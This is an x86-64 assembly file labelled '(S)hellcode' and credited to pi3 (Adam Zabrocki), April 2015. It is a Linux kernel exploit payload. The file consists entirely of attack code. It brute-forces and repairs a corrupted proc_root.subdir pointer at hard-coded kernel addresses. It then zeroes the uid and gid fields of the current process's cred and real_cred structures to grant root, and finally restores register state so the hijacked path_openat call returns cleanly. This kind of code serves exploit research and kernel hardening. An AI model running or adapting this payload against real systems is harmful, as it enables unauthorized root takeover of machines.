/*
 * (S)hellcode...
 *
 * April 2015
 * Adam 'pi3' Zabrocki
 */

.global setss
setss:
	mov %rdi, %ss
	ret

.global pi3_kcode
pi3_kcode:
/*
	int3
	int3
	int3
	int3
*/
	nop

/* First restore original proc_root.subdir value */

        /* disable interrupts - just in case */
	cli
	/* safe temporary registers */
	mov -0x38(%rsp),%rsp
	mov %rcx,%r12
	mov %rdx,%r13
	/* OK, let's go */
	mov $0xffffffff81c6fc80,%rax    // &proc_root->subdir
	mov (%rax),%rax                 // get 2 least significant bytes
	mov $0xffff880000000000,%rbx
	or  %rbx,%rax
	                                // Now we have address in format:
	                                // 0xffff8800xxyySSSS where:
	                                // SS - known
	                                // xx and yy - must be brute forced
	mov $0x1000,%rcx
	L1:
	mov $0xFFFFFFFF0000FFFF,%rdx
	and %rdx,%rax                   // zerod middle bytes
	mov %rcx,%rdx
	shl $0x10,%rdx
	or  %rdx,%rax                   // generate new value ;)
	mov 0x38(%rax),%rbx             // read value
	inc %rcx
	cmp $0xffffffff81c6fc40,%rbx
	jnz L1

/* found correct value */

	mov %rax,0xffffffff81c6fc80

/* Make 'procrop' process superprocess ;p */
	mov %gs:0xc780,%rdx             // Get 'current' process
	                                // which should be 'procroot'
	mov 0x390(%rdx),%rax            // Get 'current->real_cred'
	movl $0x0,0x1c(%rax)
	movl $0x0,0x20(%rax)
	movl $0x0,0x18(%rax)
	movl $0x0,0x14(%rax)
	movl $0x0,0x10(%rax)
	movl $0x0,0xc(%rax)
	movl $0x0,0x8(%rax)
	movl $0x0,0x4(%rax)
	mov 0x398(%rdx),%rax            // Get 'current->cred'
	movl $0x0,0x1c(%rax)
	movl $0x0,0x20(%rax)
	movl $0x0,0x18(%rax)
	movl $0x0,0x14(%rax)
	movl $0x0,0x10(%rax)
	movl $0x0,0xc(%rax)
	movl $0x0,0x8(%rax)
	movl $0x0,0x4(%rax)

/* Restore correct state for path_openat() function */

	/* first restore temporary registers */
	mov %r15,%rbx
	mov %r12,%rcx
	mov %r13,%rdx
        /* Let's go... */
//	mov -0x38(%rsp),%rsp
	mov $0xffff880000000000,%rax
	add %rax,%rsp
	mov %rsi,%r12
	mov %rsp,%rbp
	mov $0x98,%rax
	add %rax,%rbp
	xor %rax,%rax
	dec %rax
	/* enable interrupts */
	sti
	ret
